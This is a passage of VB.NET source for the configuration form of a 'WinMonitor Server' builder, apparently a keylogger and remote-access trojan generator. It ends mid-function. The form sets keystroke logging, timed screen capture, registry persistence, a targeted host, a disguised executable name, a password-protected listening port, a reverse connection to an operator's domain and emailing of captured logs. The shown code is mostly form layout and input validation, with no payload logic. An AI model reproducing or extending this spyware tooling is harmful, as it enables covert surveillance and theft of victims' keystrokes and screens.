        Me.lblNwMonitorReverseConnectionAttempt2.Name = "lblNwMonitorReverseConnectionAttempt2"
        Me.lblNwMonitorReverseConnectionAttempt2.Size = New System.Drawing.Size(148, 26)
        Me.lblNwMonitorReverseConnectionAttempt2.TabIndex = 18
        Me.lblNwMonitorReverseConnectionAttempt2.Text = "seconds"
        Me.lblNwMonitorReverseConnectionAttempt2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblNwMonitorReverseConnectionPort2
        '
        Me.lblNwMonitorReverseConnectionPort2.Location = New System.Drawing.Point(323, 54)
        Me.lblNwMonitorReverseConnectionPort2.Name = "lblNwMonitorReverseConnectionPort2"
        Me.lblNwMonitorReverseConnectionPort2.Size = New System.Drawing.Size(148, 26)
        Me.lblNwMonitorReverseConnectionPort2.TabIndex = 17
        Me.lblNwMonitorReverseConnectionPort2.Text = "[select b/w 1025-65535]"
        Me.lblNwMonitorReverseConnectionPort2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'txtNwMonitorReverseConnectionIP
        '
        Me.txtNwMonitorReverseConnectionIP.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtNwMonitorReverseConnectionIP.Location = New System.Drawing.Point(203, 32)
        Me.txtNwMonitorReverseConnectionIP.MaxLength = 15
        Me.txtNwMonitorReverseConnectionIP.Name = "txtNwMonitorReverseConnectionIP"
        Me.txtNwMonitorReverseConnectionIP.Size = New System.Drawing.Size(269, 21)
        Me.txtNwMonitorReverseConnectionIP.TabIndex = 16
        Me.txtNwMonitorReverseConnectionIP.Text = ""
        '
        'txtNwMonitorReverseConnectionAttempt
        '
        Me.txtNwMonitorReverseConnectionAttempt.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtNwMonitorReverseConnectionAttempt.Location = New System.Drawing.Point(203, 80)
        Me.txtNwMonitorReverseConnectionAttempt.MaxLength = 5
        Me.txtNwMonitorReverseConnectionAttempt.Name = "txtNwMonitorReverseConnectionAttempt"
        Me.txtNwMonitorReverseConnectionAttempt.Size = New System.Drawing.Size(114, 21)
        Me.txtNwMonitorReverseConnectionAttempt.TabIndex = 15
        Me.txtNwMonitorReverseConnectionAttempt.Text = ""
        Me.txtNwMonitorReverseConnectionAttempt.TextAlign = System.Windows.Forms.HorizontalAlignment.Right
        '
        'txtNwMonitorReverseConnectionPort
        '
        Me.txtNwMonitorReverseConnectionPort.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtNwMonitorReverseConnectionPort.Location = New System.Drawing.Point(203, 56)
        Me.txtNwMonitorReverseConnectionPort.MaxLength = 5
        Me.txtNwMonitorReverseConnectionPort.Name = "txtNwMonitorReverseConnectionPort"
        Me.txtNwMonitorReverseConnectionPort.Size = New System.Drawing.Size(114, 21)
        Me.txtNwMonitorReverseConnectionPort.TabIndex = 14
        Me.txtNwMonitorReverseConnectionPort.Text = ""
        Me.txtNwMonitorReverseConnectionPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Right
        '
        'lblNwMonitorReverseConnectionAttempt1
        '
        Me.lblNwMonitorReverseConnectionAttempt1.Location = New System.Drawing.Point(31, 78)
        Me.lblNwMonitorReverseConnectionAttempt1.Name = "lblNwMonitorReverseConnectionAttempt1"
        Me.lblNwMonitorReverseConnectionAttempt1.Size = New System.Drawing.Size(162, 26)
        Me.lblNwMonitorReverseConnectionAttempt1.TabIndex = 13
        Me.lblNwMonitorReverseConnectionAttempt1.Text = "Reverse Connection Attempt in"
        Me.lblNwMonitorReverseConnectionAttempt1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'lblNwMonitorReverseConnectionPort1
        '
        Me.lblNwMonitorReverseConnectionPort1.Location = New System.Drawing.Point(61, 54)
        Me.lblNwMonitorReverseConnectionPort1.Name = "lblNwMonitorReverseConnectionPort1"
        Me.lblNwMonitorReverseConnectionPort1.Size = New System.Drawing.Size(132, 26)
        Me.lblNwMonitorReverseConnectionPort1.TabIndex = 12
        Me.lblNwMonitorReverseConnectionPort1.Text = "Reverse Connection Port"
        Me.lblNwMonitorReverseConnectionPort1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'lblNwMonitorReverseConnectionIP
        '
        Me.lblNwMonitorReverseConnectionIP.Location = New System.Drawing.Point(11, 28)
        Me.lblNwMonitorReverseConnectionIP.Name = "lblNwMonitorReverseConnectionIP"
        Me.lblNwMonitorReverseConnectionIP.Size = New System.Drawing.Size(182, 26)
        Me.lblNwMonitorReverseConnectionIP.TabIndex = 11
        Me.lblNwMonitorReverseConnectionIP.Text = "Reverse Connection Domain Name"
        Me.lblNwMonitorReverseConnectionIP.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'lblNwMonitorRePassword
        '
        Me.lblNwMonitorRePassword.Location = New System.Drawing.Point(94, 72)
        Me.lblNwMonitorRePassword.Name = "lblNwMonitorRePassword"
        Me.lblNwMonitorRePassword.Size = New System.Drawing.Size(96, 26)
        Me.lblNwMonitorRePassword.TabIndex = 12
        Me.lblNwMonitorRePassword.Text = "Retype Password"
        Me.lblNwMonitorRePassword.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'txtNwMonitorRePassword
        '
        Me.txtNwMonitorRePassword.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtNwMonitorRePassword.Location = New System.Drawing.Point(200, 74)
        Me.txtNwMonitorRePassword.MaxLength = 20
        Me.txtNwMonitorRePassword.Name = "txtNwMonitorRePassword"
        Me.txtNwMonitorRePassword.PasswordChar = Microsoft.VisualBasic.ChrW(42)
        Me.txtNwMonitorRePassword.Size = New System.Drawing.Size(162, 21)
        Me.txtNwMonitorRePassword.TabIndex = 5
        Me.txtNwMonitorRePassword.Text = ""
        '
        'lblNwMonitorPassword
        '
        Me.lblNwMonitorPassword.Location = New System.Drawing.Point(94, 46)
        Me.lblNwMonitorPassword.Name = "lblNwMonitorPassword"
        Me.lblNwMonitorPassword.Size = New System.Drawing.Size(96, 26)
        Me.lblNwMonitorPassword.TabIndex = 4
        Me.lblNwMonitorPassword.Text = "Password"
        Me.lblNwMonitorPassword.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'txtNwMonitorPassword
        '
        Me.txtNwMonitorPassword.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtNwMonitorPassword.Location = New System.Drawing.Point(200, 48)
        Me.txtNwMonitorPassword.MaxLength = 20
        Me.txtNwMonitorPassword.Name = "txtNwMonitorPassword"
        Me.txtNwMonitorPassword.PasswordChar = Microsoft.VisualBasic.ChrW(42)
        Me.txtNwMonitorPassword.Size = New System.Drawing.Size(162, 21)
        Me.txtNwMonitorPassword.TabIndex = 3
        Me.txtNwMonitorPassword.Text = ""
        '
        'lblNwMonitorListenPort2
        '
        Me.lblNwMonitorListenPort2.Location = New System.Drawing.Point(320, 18)
        Me.lblNwMonitorListenPort2.Name = "lblNwMonitorListenPort2"
        Me.lblNwMonitorListenPort2.Size = New System.Drawing.Size(132, 26)
        Me.lblNwMonitorListenPort2.TabIndex = 2
        Me.lblNwMonitorListenPort2.Text = "[select b/w 1025-65535]"
        Me.lblNwMonitorListenPort2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'txtNwMonitorListenPort
        '
        Me.txtNwMonitorListenPort.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtNwMonitorListenPort.Location = New System.Drawing.Point(200, 22)
        Me.txtNwMonitorListenPort.MaxLength = 5
        Me.txtNwMonitorListenPort.Name = "txtNwMonitorListenPort"
        Me.txtNwMonitorListenPort.Size = New System.Drawing.Size(114, 21)
        Me.txtNwMonitorListenPort.TabIndex = 1
        Me.txtNwMonitorListenPort.Text = ""
        Me.txtNwMonitorListenPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Right
        '
        'lblNwMonitorListenPort1
        '
        Me.lblNwMonitorListenPort1.Location = New System.Drawing.Point(94, 20)
        Me.lblNwMonitorListenPort1.Name = "lblNwMonitorListenPort1"
        Me.lblNwMonitorListenPort1.Size = New System.Drawing.Size(96, 26)
        Me.lblNwMonitorListenPort1.TabIndex = 0
        Me.lblNwMonitorListenPort1.Text = "Listening Port "
        Me.lblNwMonitorListenPort1.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'btnWinMonitorServerConfigOk
        '
        Me.btnWinMonitorServerConfigOk.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnWinMonitorServerConfigOk.ForeColor = System.Drawing.Color.Black
        Me.btnWinMonitorServerConfigOk.Location = New System.Drawing.Point(354, 312)
        Me.btnWinMonitorServerConfigOk.Name = "btnWinMonitorServerConfigOk"
        Me.btnWinMonitorServerConfigOk.Size = New System.Drawing.Size(78, 20)
        Me.btnWinMonitorServerConfigOk.TabIndex = 4
        Me.btnWinMonitorServerConfigOk.Text = "&Ok"
        '
        'btnWinMonitorServerConfigCancel
        '
        Me.btnWinMonitorServerConfigCancel.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnWinMonitorServerConfigCancel.ForeColor = System.Drawing.Color.Black
        Me.btnWinMonitorServerConfigCancel.Location = New System.Drawing.Point(435, 312)
        Me.btnWinMonitorServerConfigCancel.Name = "btnWinMonitorServerConfigCancel"
        Me.btnWinMonitorServerConfigCancel.Size = New System.Drawing.Size(78, 20)
        Me.btnWinMonitorServerConfigCancel.TabIndex = 5
        Me.btnWinMonitorServerConfigCancel.Text = "&Cancel"
        '
        'frmWinMonitorServerConfig
        '
        Me.AutoScaleBaseSize = New System.Drawing.Size(5, 13)
        Me.ClientSize = New System.Drawing.Size(519, 338)
        Me.Controls.AddRange(New System.Windows.Forms.Control() {Me.btnWinMonitorServerConfigCancel, Me.btnWinMonitorServerConfigOk, Me.tabWinMonitorServerConfigurations})
        Me.ForeColor = System.Drawing.SystemColors.Control
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "frmWinMonitorServerConfig"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "WinMonitor Server Configuration Settings"
        Me.tabWinMonitorServerConfigurations.ResumeLayout(False)
        Me.tabpgeKeyMonitorOptions.ResumeLayout(False)
        Me.gbxKeyMonitorOptions.ResumeLayout(False)
        Me.gbxKeyMonitorRootDir.ResumeLayout(False)
        Me.gbxKeyMonitorOptionsAdditional.ResumeLayout(False)
        Me.gbxKeyMonitorFileExtn.ResumeLayout(False)
        Me.tabpgeScreenMonitorOptions.ResumeLayout(False)
        Me.gbxScreenSnatcherOptions.ResumeLayout(False)
        Me.gbxScreenMonitorRootDir.ResumeLayout(False)
        Me.gbxScreenMonitorOptionsAdditional.ResumeLayout(False)
        Me.tabpgeWinMonitorServerOptions.ResumeLayout(False)
        Me.gbxWinMonitorOptions.ResumeLayout(False)
        Me.gbxWinMonitorRegisterLocations.ResumeLayout(False)
        Me.gbxWinMonitorHKEY_LOCAL_USER.ResumeLayout(False)
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE.ResumeLayout(False)
        Me.tabpgeNetworkMonitorOptions.ResumeLayout(False)
        Me.gbxNetworkMonitorOptions.ResumeLayout(False)
        Me.gbxNwMonitorReverseConnection.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

#End Region

#Region "Button Events"

    Private Sub btnWinMonitorServerConfigOk_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnWinMonitorServerConfigOk.Click
        If (MessageBox.Show(IDS_WINMONITOR_BUILDER_QUIT, Me.Text(), MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1) = DialogResult.Yes) Then Me.Close()
    End Sub

    Private Sub btnWinMonitorNameAdvancedOptions_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnWinMonitorNameAdvancedOptions.Click
        m_frmWinMonitorNameAdvanced.ShowDialog()
    End Sub

    Private Sub btnWinMonitorServerConfigCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnWinMonitorServerConfigCancel.Click
        Me.Close()
    End Sub

    Private Sub btnWinMonitorBuild_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnWinMonitorBuild.Click
        If (Not m_objStringUtility.ValidPathAndFileName(txtLogFileName.Text, False)) Then
            m_objStringUtility.MsgErr(IDS_FILEORPATH_INVALID, Me.Text)
            tabWinMonitorServerConfigurations.SelectedIndex = tabpgeKeyMonitorOptions.TabIndex
            txtLogFileName.Focus()
            m_objStringUtility.SelectText(txtLogFileName)
            Return
        End If
        If ((Not m_objStringUtility.IsNumeralString(txtFileUploadSize.Text)) Or (Val(txtFileUploadSize.Text) > IDL_KEYLOG_MAXSIZE) Or (Val(txtFileUploadSize.Text) < IDL_KEYLOG_MINSIZE)) Then
            m_objStringUtility.MsgErr(IDS_KEYLOG_SIZE_INVALID, Me.Text)
            tabWinMonitorServerConfigurations.SelectedIndex = tabpgeKeyMonitorOptions.TabIndex
            txtFileUploadSize.Focus()
            m_objStringUtility.SelectText(txtFileUploadSize)
            Return
        End If
        If (Not m_objStringUtility.ValidPathAndFileName(txtScreenMonitorDirName.Text, True)) Then
            m_objStringUtility.MsgErr(IDS_FILEORPATH_INVALID, Me.Text)
            tabWinMonitorServerConfigurations.SelectedIndex = tabpgeScreenMonitorOptions.TabIndex
            txtScreenMonitorDirName.Focus()
            m_objStringUtility.SelectText(txtScreenMonitorDirName)
            Return
        End If
        If ((Not m_objStringUtility.IsNumeralString(txtPictureLmt.Text)) Or (Val(txtPictureLmt.Text) > IDI_BMPFILE_MAXCOUNT) Or (Val(txtPictureLmt.Text) < IDI_BMPFILE_MINCOUNT)) Then
            m_objStringUtility.MsgErr(IDS_BMPFILECOUNT_INVALID, Me.Text)
            tabWinMonitorServerConfigurations.SelectedIndex = tabpgeScreenMonitorOptions.TabIndex
            txtPictureLmt.Focus()
            m_objStringUtility.SelectText(txtPictureLmt)
            Return
        End If

        Dim txtTmpBox As TextBox
        Select Case True
            Case rdobtnScreenMonitorIntervalsHours.Checked
                txtTmpBox = txtScreenMonitorIntervalsHours
            Case rdobtnScreenMonitorIntervalsMinitues.Checked
                txtTmpBox = txtScreenMonitorIntervalsMinitues
            Case rdobtnScreenMonitorIntervalsSeconds.Checked
                txtTmpBox = txtScreenMonitorIntervalsSeconds
        End Select

        If ((Not m_objStringUtility.IsNumeralString(txtTmpBox.Text)) Or (Val(txtTmpBox.Text) > IDL_TIME_MAXINTERVAL) Or (Val(txtTmpBox.Text) < IDL_TIME_MININTERVAL)) Then
            m_objStringUtility.MsgErr(IDS_TIMEINTERVAL_INVALID, Me.Text)
            tabWinMonitorServerConfigurations.SelectedIndex = tabpgeScreenMonitorOptions.TabIndex
            txtTmpBox.Focus()
            m_objStringUtility.SelectText(txtTmpBox)
            Return
        End If

        Dim intI As Integer = 0
        While (intI <= 1)
            If (intI = 0) Then
                txtTmpBox = txtNwMonitorListenPort
            Else
                If (rdobtnReverseConnectionDisable.Checked = True) Then Exit While
                txtTmpBox = txtNwMonitorReverseConnectionPort
            End If
            If ((Not m_objStringUtility.IsNumeralString(txtTmpBox.Text)) Or (Val(txtTmpBox.Text) > IDI_UPPER_PORT) Or (Val(txtTmpBox.Text) < IDI_LOWER_PORT)) Then
                m_objStringUtility.MsgErr(IDS_PORTNUMBER_INVALID, Me.Text)
                tabWinMonitorServerConfigurations.SelectedIndex = tabpgeNetworkMonitorOptions.TabIndex
                txtTmpBox.Focus()
                m_objStringUtility.SelectText(txtTmpBox)
                Return
            End If
            intI += 1
        End While

        If (Not txtNwMonitorPassword.Text.Equals(txtNwMonitorRePassword.Text)) Then
            m_objStringUtility.MsgErr(IDS_PASSWORDS_CONFLICTED, Me.Text)
            tabWinMonitorServerConfigurations.SelectedIndex = tabpgeNetworkMonitorOptions.TabIndex
            txtNwMonitorRePassword.Focus()
            m_objStringUtility.SelectText(txtNwMonitorRePassword)
            Return
        End If
        If (rdobtnReverseConnectionEnable.Checked = True) Then
            'If (Not m_objStringUtility.ValidIP(txtNwMonitorReverseConnectionIP.Text)) Then
            If (txtNwMonitorReverseConnectionIP.Text.Trim().Equals(IDS_NULL_STRING)) Then
                m_objStringUtility.MsgErr(IDS_DOMAIN_INVALID, Me.Text)
                tabWinMonitorServerConfigurations.SelectedIndex = tabpgeNetworkMonitorOptions.TabIndex
                txtNwMonitorReverseConnectionIP.Focus()
                m_objStringUtility.SelectText(txtNwMonitorReverseConnectionIP)
                Return
            End If
            If ((Not m_objStringUtility.IsNumeralString(txtNwMonitorReverseConnectionAttempt.Text)) Or (Val(txtNwMonitorReverseConnectionAttempt.Text) > IDL_TIME_MAXINTERVAL) Or (Val(txtNwMonitorReverseConnectionAttempt.Text) < IDL_TIME_MININTERVAL)) Then
                m_objStringUtility.MsgErr(IDS_TIMEINTERVAL_INVALID, Me.Text)
                tabWinMonitorServerConfigurations.SelectedIndex = tabpgeNetworkMonitorOptions.TabIndex
                txtNwMonitorReverseConnectionAttempt.Focus()
                m_objStringUtility.SelectText(txtNwMonitorReverseConnectionAttempt)
                Return
            End If
        End If

        Dim strErrMsg As String
        intI = 0
        While (intI <= 4)
            Select Case intI
                Case 0
                    txtTmpBox = txtWinMonitorInternalName
                    strErrMsg = IDS_EXE_INTERNALNAME_INVALID
                Case 1
                    txtTmpBox = txtWinMonitorRegKeyName
                    strErrMsg = IDS_EXE_REGISTRYNAME_INVALID
                Case 2
                    txtTmpBox = txtWinMonitorTargetedHostName
                    strErrMsg = IDS_EXE_TARGET_HOSTNAME_INVALID
                Case 3
                    txtTmpBox = txtNwMonitorEmail
                    strErrMsg = IDS_EMAIL_INVALID
                Case 4
                    txtTmpBox = txtNwMonitorEmailServer
                    strErrMsg = IDS_EMAIL_SERVER_INVALID
            End Select
            If ((intI <> 3 Or intI <> 4 Or chkboxNwMonitorEmail.Checked = True) And (Not m_objStringUtility.IsValidIdentifier(txtTmpBox.Text))) Then
                m_objStringUtility.MsgErr(strErrMsg, Me.Text)
                tabWinMonitorServerConfigurations.SelectedIndex = IIf(intI <> 3, tabpgeWinMonitorServerOptions.TabIndex, tabpgeNetworkMonitorOptions.TabIndex)
                txtTmpBox.Focus()
                m_objStringUtility.SelectText(txtTmpBox)
                Return
            End If
            intI += 1
        End While

        If (Not System.IO.Directory.Exists(txtWinMonitorSaveDir.Text)) Then
            m_objStringUtility.MsgErr(IDS_FILEORPATH_INVALID, Me.Text)
            tabWinMonitorServerConfigurations.SelectedIndex = tabpgeWinMonitorServerOptions.TabIndex
            txtWinMonitorSaveDir.Focus()
            m_objStringUtility.SelectText(txtWinMonitorSaveDir)
            Return
        End If

        If (Not m_objStringUtility.ValidPathAndFileName(m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text, False)) Then
            m_objStringUtility.MsgErr(IDS_FILEORPATH_INVALID, Me.Text)
            tabWinMonitorServerConfigurations.SelectedIndex = tabpgeWinMonitorServerOptions.TabIndex
            m_frmWinMonitorNameAdvanced.ShowDialog()
            m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Focus()
            m_objStringUtility.SelectText(m_frmWinMonitorNameAdvanced.txtWinMonitorFileName)
            Return
        End If

        INIWriter()
        XmlWriter()
    End Sub

#End Region

#Region "TextBox Events"

    Private Sub txtFileUploadSize_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtFileUploadSize.KeyUp
        If (e.KeyCode = Keys.Enter) Then
            SendKeys.Send("{TAB}")
            Return
        End If

        Dim lngTmpValueLimitUpper As Long
        Dim lngTmpValueLimitLower As Long

        Select Case m_intCurrentNumeralTextBox
            Case LENGTH_IDS.ID_KEYLOGGER_FILESIZE
                lngTmpValueLimitUpper = IDL_KEYLOG_MAXSIZE
                lngTmpValueLimitLower = IDL_KEYLOG_MINSIZE
            Case LENGTH_IDS.ID_TIMEINTERVAL
                lngTmpValueLimitUpper = IDL_TIME_MAXINTERVAL
                lngTmpValueLimitLower = IDL_TIME_MININTERVAL
            Case LENGTH_IDS.ID_BITMAPCNT
                lngTmpValueLimitUpper = IDI_BMPFILE_MAXCOUNT
                lngTmpValueLimitLower = IDI_BMPFILE_MINCOUNT
        End Select

        If ((Not (CType(sender, TextBox).Text.Equals(IDS_NULL_STRING))) And ((Val(CType(sender, TextBox).Text) < lngTmpValueLimitLower) Or (Val(CType(sender, TextBox).Text) > lngTmpValueLimitUpper) Or (Not m_objStringUtility.IsNumeralString(CType(sender, TextBox).Text)))) Then
            CType(sender, TextBox).Text = CType(sender, TextBox).Tag
            CType(sender, TextBox).Focus()
            If (Not (CType(sender, TextBox).Text.Equals(IDS_NULL_STRING))) Then SendKeys.Send("{END}")
        Else
            If (Not (CType(sender, TextBox).Text.Trim().Equals(IDS_NULL_STRING))) Then CType(sender, TextBox).Tag = CType(sender, TextBox).Text
        End If
    End Sub

    Private Sub txtFileUploadSize_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtFileUploadSize.Validated
        Dim strCurrent As String = CType(sender, TextBox).Text
        Dim strPrevious As String = CType(CType(sender, TextBox).Tag, String)

        If (strCurrent.Equals(strPrevious)) Then Return

        Dim lngTmpValueLimitUpper As Long
        Dim lngTmpValueLimitLower As Long
        Dim strErrMessage As String
        Select Case m_intCurrentNumeralTextBox
            Case LENGTH_IDS.ID_KEYLOGGER_FILESIZE
                lngTmpValueLimitUpper = IDL_KEYLOG_MAXSIZE
                lngTmpValueLimitLower = IDL_KEYLOG_MINSIZE
                strErrMessage = IDS_KEYLOG_SIZE_INVALID
            Case LENGTH_IDS.ID_TIMEINTERVAL
                lngTmpValueLimitUpper = IDL_TIME_MAXINTERVAL
                lngTmpValueLimitLower = IDL_TIME_MININTERVAL
                strErrMessage = IDS_TIMEINTERVAL_INVALID
            Case LENGTH_IDS.ID_BITMAPCNT
                lngTmpValueLimitUpper = IDI_BMPFILE_MAXCOUNT
                lngTmpValueLimitLower = IDI_BMPFILE_MINCOUNT
                strErrMessage = IDS_BMPFILECOUNT_INVALID
        End Select

        If ((Not m_objStringUtility.IsNumeralString(CType(sender, TextBox).Text)) Or (Val(CType(sender, TextBox).Text) > lngTmpValueLimitUpper) Or (Val(CType(sender, TextBox).Text) < lngTmpValueLimitLower)) Then
            CType(sender, TextBox).Tag = CType(sender, TextBox).Text
            MessageBox.Show(strErrMessage, Me.Text(), MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
            Return
        End If
    End Sub

    Private Sub txtScreenMonitorIntervalsSeconds_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtScreenMonitorIntervalsSeconds.KeyUp
        m_intCurrentNumeralTextBox = LENGTH_IDS.ID_TIMEINTERVAL
        Call txtFileUploadSize_KeyUp(sender, e)
        m_intCurrentNumeralTextBox = LENGTH_IDS.ID_KEYLOGGER_FILESIZE
    End Sub

    Private Sub txtScreenMonitorIntervalsSeconds_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtScreenMonitorIntervalsSeconds.Validated
        m_intCurrentNumeralTextBox = LENGTH_IDS.ID_TIMEINTERVAL
        Call txtFileUploadSize_Validated(sender, e)
        m_intCurrentNumeralTextBox = LENGTH_IDS.ID_KEYLOGGER_FILESIZE
    End Sub

    Private Sub txtScreenMonitorIntervalsMinitues_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtScreenMonitorIntervalsMinitues.KeyUp
        Call txtScreenMonitorIntervalsSeconds_KeyUp(sender, e)
    End Sub

    Private Sub txtScreenMonitorIntervalsMinitues_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtScreenMonitorIntervalsMinitues.Validated
        Call txtScreenMonitorIntervalsSeconds_Validated(sender, e)
    End Sub

    Private Sub txtNwMonitorReverseConnectionAttempt_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtNwMonitorReverseConnectionAttempt.KeyUp
        Call txtScreenMonitorIntervalsSeconds_KeyUp(sender, e)
    End Sub

    Private Sub txtNwMonitorReverseConnectionAttempt_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtNwMonitorReverseConnectionAttempt.Validated
        Call txtScreenMonitorIntervalsSeconds_Validated(sender, e)
    End Sub

    Private Sub txtScreenMonitorIntervalsHours_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtScreenMonitorIntervalsHours.KeyUp
        Call txtScreenMonitorIntervalsSeconds_KeyUp(sender, e)
    End Sub

    Private Sub txtScreenMonitorIntervalsHours_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtScreenMonitorIntervalsHours.Validated
        Call txtScreenMonitorIntervalsSeconds_Validated(sender, e)
    End Sub

    Private Sub txtPictureLmt_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtPictureLmt.KeyUp
        m_intCurrentNumeralTextBox = LENGTH_IDS.ID_BITMAPCNT
        Call txtFileUploadSize_KeyUp(sender, e)
        m_intCurrentNumeralTextBox = LENGTH_IDS.ID_KEYLOGGER_FILESIZE
    End Sub

    Private Sub txtPictureLmt_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtPictureLmt.Validated
        m_intCurrentNumeralTextBox = LENGTH_IDS.ID_BITMAPCNT
        Call txtFileUploadSize_Validated(sender, e)
        m_intCurrentNumeralTextBox = LENGTH_IDS.ID_KEYLOGGER_FILESIZE
    End Sub

    Private Sub txtNwMonitorReverseConnectionPort_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtNwMonitorReverseConnectionPort.KeyUp
        m_intPortBoxes = PORT_IDS.ID_REVERSE_PORT
        Call txtNwMonitorListenPort_KeyUp(sender, e)
        m_intPortBoxes = PORT_IDS.ID_LISTEN_PORT
    End Sub

    Private Sub txtNwMonitorReverseConnectionPort_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtNwMonitorReverseConnectionPort.Validated
        m_intPortBoxes = PORT_IDS.ID_REVERSE_PORT
        Call txtNwMonitorListenPort_Validated(sender, e)
        m_intPortBoxes = PORT_IDS.ID_LISTEN_PORT
    End Sub

    Private Sub txtNwMonitorListenPort_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtNwMonitorListenPort.KeyUp
        If (e.KeyCode = Keys.Enter) Then
            SendKeys.Send("{TAB}")
            Return
        End If
        If ((Not (CType(sender, TextBox).Text.Equals(IDS_NULL_STRING))) And ((Val(CType(sender, TextBox).Text) < 0) Or (Val(CType(sender, TextBox).Text) > IDI_UPPER_PORT) Or (Not m_objStringUtility.IsNumeralString(CType(sender, TextBox).Text)))) Then
            CType(sender, TextBox).Text = CType(sender, TextBox).Tag
            CType(sender, TextBox).Focus()
            If (Not (CType(sender, TextBox).Text.Equals(IDS_NULL_STRING))) Then SendKeys.Send("{END}")
        Else
            m_boolPortNotChanged(m_intPortBoxes) = False
            If (Not (CType(sender, TextBox).Text.Trim().Equals(IDS_NULL_STRING))) Then CType(sender, TextBox).Tag = CType(sender, TextBox).Text
        End If
    End Sub

    Private Sub txtNwMonitorListenPort_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtNwMonitorListenPort.Validated
        If ((Not m_objStringUtility.IsNumeralString(CType(sender, TextBox).Text)) Or (Val(CType(sender, TextBox).Text) > IDI_UPPER_PORT) Or (Val(CType(sender, TextBox).Text) < IDI_LOWER_PORT)) Then
            CType(sender, TextBox).Tag = CType(sender, TextBox).Text
            If (m_boolPortNotChanged(m_intPortBoxes) = False) Then MessageBox.Show(IDS_PORTNUMBER_INVALID, Me.Text(), MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
            m_boolPortNotChanged(m_intPortBoxes) = True
            Return
        End If
    End Sub

    Public Sub txtLogFileName_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtLogFileName.KeyUp
        If (e.KeyCode = Keys.Enter) Then
            SendKeys.Send("{TAB}")
            Return
        End If

        Dim boolValid As Boolean = False

        Select Case m_intCurrentTextBox
            Case TEXT_IDS.ID_KEYLOGGER_FILENAME, TEXT_IDS.ID_EXE_FILE_NAME, TEXT_IDS.ID_SCREENMONITOR_DIRNAME
                boolValid = m_objStringUtility.ValidPathAndFileNameChar(CType(sender, TextBox).Text)
            Case TEXT_IDS.ID_EXE_SETUP_SAVEDIR
                boolValid = True
            Case TEXT_IDS.ID_IP
                boolValid = m_objStringUtility.ValidIPChar(CType(sender, TextBox).Text)
            Case TEXT_IDS.ID_EMAIL, TEXT_IDS.ID_EMAIL_SERVER, TEXT_IDS.ID_EXE_TARGET_HOSTNAME, TEXT_IDS.ID_EXE_REGISTRYNAME, TEXT_IDS.ID_EXE_INTERNAL_NAME, TEXT_IDS.ID_DOMAIN
                boolValid = m_objStringUtility.IsValidIdentifierChar(CType(sender, TextBox).Text)
        End Select

        If (Not boolValid) Then
            CType(sender, TextBox).Text = CType(sender, TextBox).Tag
            CType(sender, TextBox).Focus()
